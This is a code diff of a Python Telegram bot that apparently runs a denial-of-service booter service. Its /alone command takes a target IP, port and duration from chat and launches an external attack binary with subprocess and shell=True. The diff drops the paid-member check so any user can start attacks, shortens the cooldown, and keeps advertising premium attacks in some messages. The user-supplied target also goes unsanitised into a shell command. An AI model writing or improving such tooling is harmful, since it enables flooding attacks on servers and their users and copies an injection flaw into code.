@@ -222,47 +222,53 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response, reply_markup=get_inline_keyboard())
 
 # Dictionary to store the last time each user ran the / command
-bgmi_cooldown = {}
+# Dictionary to track cooldowns
+cooldown_tracker = {}
 
-COOLDOWN_TIME =150
+# Cooldown duration in seconds
+COOLDOWN_DURATION = 60
 
-# Handler for /alone command
 @bot.message_handler(commands=['alone'])
-def handle_bgmi(message):
+def handle_alone_command(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /alone Command Again buy premium instant attack with zero sec dm @GODxAloneBOY."
-                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 300:
-                response = "Error: Time interval must be less than 120."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./pushpa {target} {port} {time} 400"
-                subprocess.run(full_command, shell=True)
-                response = f"🍀 ᗪᗪOS ᑌSEᖇ\n\n💣 ᗩTTᗩᑕK ᖴIᑎISᕼEᗪ 💣\n\nDM :- @GODxAloneBOY"
+    current_time = datetime.datetime.now()
+
+    # Check if the user is in the cooldown tracker
+    if user_id in cooldown_tracker:
+        last_used_time = cooldown_tracker[user_id]
+        elapsed_time = (current_time - last_used_time).seconds
+
+        # Check if the user is still on cooldown
+        if elapsed_time < COOLDOWN_DURATION:
+            remaining_time = COOLDOWN_DURATION - elapsed_time
+            response = f"⏳ You are on cooldown. Please wait {remaining_time} seconds before using the /alone command again."
+            bot.reply_to(message, response, reply_markup=get_inline_keyboard())
+            return
+
+    # If no cooldown or cooldown has expired, execute the command
+    command = message.text.split()
+    if len(command) == 4:  # Ensure the command has the correct format
+        target = command[1]
+        port = int(command[2])  # Convert to integer
+        time = int(command[3])  # Convert to integer
+
+        if time > 300:
+            response = "❌ Error: Time interval must be less than or equal to 300 seconds."
         else:
-            response = "⚠️iᑎᐯᗩᒪIᗪ\n\n E᙭ᗩᗰᑭᒪE: /alone <ɪᴘ> <ᴘᴏʀᴛ>"
+            # Record the command execution and update cooldown tracker
+            record_command_logs(user_id, '/alone', target, port, time)
+            log_command(user_id, target, port, time)
+            cooldown_tracker[user_id] = current_time  # Update cooldown tracker
+
+            # Execute the command
+            start_attack_reply(message, target, port, time)
+            full_command = f"./alone {target} {port} {time} 400"
+            subprocess.run(full_command, shell=True)
+            response = "✅ Attack finished successfully!"
     else:
-        response = "OᑎᒪY ᑭᗩIᗪ ᗰEᗰᗷEᖇ ᑌSE TᕼIS ᗷOT\n\n DM :- @GODxAloneBOY to 🗝️"
+        response = "⚠️ Invalid command format. Example: /alone <IP> <Port> <Time>"
 
     bot.reply_to(message, response, reply_markup=get_inline_keyboard())
-
-
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
